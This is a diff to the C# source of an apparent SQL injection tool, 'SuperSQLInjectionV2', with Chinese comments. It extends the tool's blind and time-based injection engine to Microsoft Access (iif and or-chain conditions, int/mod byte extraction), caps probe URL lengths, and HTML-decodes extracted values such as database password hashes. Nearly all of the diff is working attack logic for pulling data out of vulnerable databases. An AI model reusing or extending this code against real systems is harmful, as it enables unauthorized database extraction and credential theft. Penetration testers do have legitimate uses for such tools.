@@ -179,7 +179,8 @@ namespace SuperSQLInjectionV2.Models.Data
                     Match m = GetCachedRegex("(?<=(" + EchoMarkers.Start + EchoMarkers.Split + "))[.\\s\\S]*?(?=(" + EchoMarkers.Split + EchoMarkers.End + "))").Match(body);
                     if (m.Success)
                     {
-                        return m.Value;
+                        //页面HTML转义回显（&lt; &amp; &#39;等）还原为数据库原文（如MySQL8 hash内含<&字符）
+                        return System.Net.WebUtility.HtmlDecode(m.Value);
                     }
                 }
             }
@@ -258,7 +259,8 @@ namespace SuperSQLInjectionV2.Models.Data
                         }
                     }
                     Log.Warning("检测到服务器截断输出（结束标记丢失），已抢救部分数据：" + value.Length + "字符（possible server trimmed output）");
-                    return value;
+                    //截断值同样可能含HTML实体（截在半截实体时HtmlDecode保持原样，安全）
+                    return System.Net.WebUtility.HtmlDecode(value);
                 }
             }
             catch (Exception e)
@@ -449,7 +451,7 @@ namespace SuperSQLInjectionV2.Models.Data
             {
                 return true;
             }
-            string cond = "(case when (" + exprPayload + ")<>" + code + " then 1 else 0 end)";
+            string cond = CaseWhen(config, "(" + exprPayload + ")<>" + code);
             bool notEq = await ProbeBool(config, cond, 0).ConfigureAwait(false);
             if (!notEq)
             {
@@ -947,6 +949,34 @@ namespace SuperSQLInjectionV2.Models.Data
             return new string(c1, 1);
         }
 
+        /// <summary>CASE WHEN条件包装：Access无CASE WHEN语法（仅VBA式iif），用iif等价；条件为纯布尔表达式</summary>
+        private static string CaseWhen(AppConfig config, string condition)
+        {
+            return config.DataConfig.SelectedDBType == DBType.Access
+                ? "iif(" + condition + ",1,0)"
+                : "(case when " + condition + " then 1 else 0 end)";
+        }
+
+        /// <summary>IN集合条件：Access表达式上下文不支持IN运算符，用or等值链等价</summary>
+        private static string InCondition(AppConfig config, string payload, IReadOnlyList<int> values)
+        {
+            if (config.DataConfig.SelectedDBType == DBType.Access)
+            {
+                return string.Join(" or ", values.Select(v => "(" + payload + ")=" + v));
+            }
+            return "(" + payload + ") in (" + string.Join(",", values) + ")";
+        }
+
+        /// <summary>
+        /// IN/or探测组的候选数上限（URL长度保护）：按payload真实URL编码长度估算单候选开销，
+        /// 请求行预算7000字节（Kestrel/IIS默认8K上限留余量；超上限服务器414/400会被盲注oracle误判为假）
+        /// </summary>
+        private static int MaxInGroupItems(string payload)
+        {
+            int perItem = Uri.EscapeDataString(payload).Length + 16; //+16: "=123 or "包装与连接符编码
+            return Math.Max(2, 7000 / Math.Max(perItem, 1));
+        }
+
         /// <summary>
         /// 频率有序 IN 集合二分：候选须保证包含真实值（调用方经ASCII预检/hex输出特性保证），收敛到唯一候选即返回。
         /// prefix非空且候选为全ASCII/字节区间时融入n-gram模型概率（只影响分组顺序，不影响候选全集）；
@@ -1011,7 +1041,7 @@ namespace SuperSQLInjectionV2.Models.Data
                 {
                     config.CheckStop();
                     int cand = list[0];
-                    string eqCond = "(case when (" + payload + ") in (" + cand + ") then 1 else 0 end)";
+                    string eqCond = CaseWhen(config, InCondition(config, payload, new[] { cand }));
                     if (await ProbeBool(config, eqCond, 0).ConfigureAwait(false))
                     {
                         list = new List<int> { cand };
@@ -1044,9 +1074,18 @@ namespace SuperSQLInjectionV2.Models.Data
                     cut = list.Count - 2;
                 }
                 List<int> highGroup = list.Take(cut + 1).ToList();
-                string cond = "(case when (" + payload + ") in (" + string.Join(",", highGroup) + ") then 1 else 0 end)";
+                //URL长度保护：长表达式（Access iif/or链、嵌套子查询）×多候选编码后请求行可超服务器上限
+                //（实测Access 12候选×ascw嵌套表达式=14KB请求行，超Kestrel 8K返回414被oracle误判为假，
+                //真值所在组被丢弃→收敛到错误码点）。探测组截为长度安全的前缀子组：
+                //true→候选缩到子组；false→只排除已探测子组，真值永不丢（收缩变慢但正确）
+                int maxItems = MaxInGroupItems(payload);
+                if (highGroup.Count > maxItems)
+                {
+                    highGroup = highGroup.Take(maxItems).ToList();
+                }
+                string cond = CaseWhen(config, InCondition(config, payload, highGroup));
                 bool inHigh = await ProbeBool(config, cond, 0).ConfigureAwait(false);
-                list = inHigh ? highGroup : list.Skip(cut + 1).ToList();
+                list = inHigh ? highGroup : list.Skip(highGroup.Count).ToList();
             }
             int result = list[0];
             _charFreqObserved.AddOrUpdate(result, 1, (_, c) => c + 1);
@@ -1662,7 +1701,7 @@ namespace SuperSQLInjectionV2.Models.Data
             {
                 string candidate = candidates[idx];
                 string lit = candidate.Replace("'", "''", StringComparison.Ordinal);
-                string cond = "(case when (" + dataPayload + ")='" + lit + "' then 1 else 0 end)";
+                string cond = CaseWhen(config, "(" + dataPayload + ")='" + lit + "'");
                 bool hit = await ProbeBool(config, cond, 0).ConfigureAwait(false);
                 if (!hit)
                 {
@@ -1671,7 +1710,7 @@ namespace SuperSQLInjectionV2.Models.Data
                 //时间盲注：NOT等值反向复核（正反都为真=信道静态不可信，放弃该候选）
                 if (config.DataConfig.SelectedInjectType == InjectType.Time)
                 {
-                    string notCond = "(case when (" + dataPayload + ")<>'" + lit + "' then 1 else 0 end)";
+                    string notCond = CaseWhen(config, "(" + dataPayload + ")<>'" + lit + "'");
                     bool notHit = await ProbeBool(config, notCond, 0).ConfigureAwait(false);
                     if (notHit)
                     {
@@ -1721,7 +1760,7 @@ namespace SuperSQLInjectionV2.Models.Data
         private static async Task<bool> PredictEqualCheck(AppConfig config, string casted, string candidate)
         {
             string lit = candidate.Replace("'", "''", StringComparison.Ordinal);
-            string cond = "(case when (" + casted + ")='" + lit + "' then 1 else 0 end)";
+            string cond = CaseWhen(config, "(" + casted + ")='" + lit + "'");
             bool hit = await ProbeBool(config, cond, 0).ConfigureAwait(false);
             if (!hit)
             {
@@ -1730,7 +1769,7 @@ namespace SuperSQLInjectionV2.Models.Data
             //时间盲注：NOT等值反向复核（正反都为真=信道静态不可信，放弃该候选，同低基数猜测）
             if (config.DataConfig.SelectedInjectType == InjectType.Time)
             {
-                string notCond = "(case when (" + casted + ")<>'" + lit + "' then 1 else 0 end)";
+                string notCond = CaseWhen(config, "(" + casted + ")<>'" + lit + "'");
                 if (await ProbeBool(config, notCond, 0).ConfigureAwait(false))
                 {
                     return false;
@@ -1882,7 +1921,7 @@ namespace SuperSQLInjectionV2.Models.Data
                 if (lcp.Length > known.Length && lcp.Length <= len)
                 {
                     spent++;
-                    string cond = "(case when (" + TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", casted), ("start", 1), ("len", lcp.Length)) + ")='" + lcp.Replace("'", "''", StringComparison.Ordinal) + "' then 1 else 0 end)";
+                    string cond = CaseWhen(config, "(" + TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", casted), ("start", 1), ("len", lcp.Length)) + ")='" + lcp.Replace("'", "''", StringComparison.Ordinal) + "'");
                     if (await ProbeBool(config, cond, 0).ConfigureAwait(false))
                     {
                         known = lcp;
@@ -1905,7 +1944,7 @@ namespace SuperSQLInjectionV2.Models.Data
                 {
                     spent++;
                     int pos = known.Length + 1;
-                    string cond = "(case when (" + TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", casted), ("start", pos), ("len", 1)) + ")='" + g.Key + "' then 1 else 0 end)";
+                    string cond = CaseWhen(config, "(" + TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", casted), ("start", pos), ("len", 1)) + ")='" + g.Key + "'");
                     if (await ProbeBool(config, cond, 0).ConfigureAwait(false))
                     {
                         next = match.First(m => char.ToLowerInvariant(m[known.Length]) == g.Key)[known.Length];
@@ -2028,8 +2067,12 @@ namespace SuperSQLInjectionV2.Models.Data
                 //多字节码点两段式：高字节=floor(x/256)、低字节=x%256，各走0~255频率IN二分
                 //（URL长度可控，等值预探生效；CJK高字节0x4E~0x9F权重前置），
                 //较256~65535均匀二分（16次/~8次判真）发包≈-30%、判真≈-40%
-                int hiByte = await GetBoolValueFreq(config, "floor((" + payload + ")/256)", LowCodepointCache, null, HiByteWeight).ConfigureAwait(false);
-                int loByte = await GetBoolValueFreq(config, "((" + payload + ")%256)", ByteRangeCache, null, LoByteWeight).ConfigureAwait(false);
+                //Access无floor/%运算符：int()截断取整+mod取余等价（码点经iif补偿恒为非负整数，截断=floor）
+                bool isAccess = config.DataConfig.SelectedDBType == DBType.Access;
+                string hiExpr = isAccess ? "int((" + payload + ")/256)" : "floor((" + payload + ")/256)";
+                string loExpr = isAccess ? "((" + payload + ") mod 256)" : "((" + payload + ")%256)";
+                int hiByte = await GetBoolValueFreq(config, hiExpr, LowCodepointCache, null, HiByteWeight).ConfigureAwait(false);
+                int loByte = await GetBoolValueFreq(config, loExpr, ByteRangeCache, null, LoByteWeight).ConfigureAwait(false);
                 return hiByte * 256 + loByte;
             }).ConfigureAwait(false);
             if (gbkDecode && code > 255)
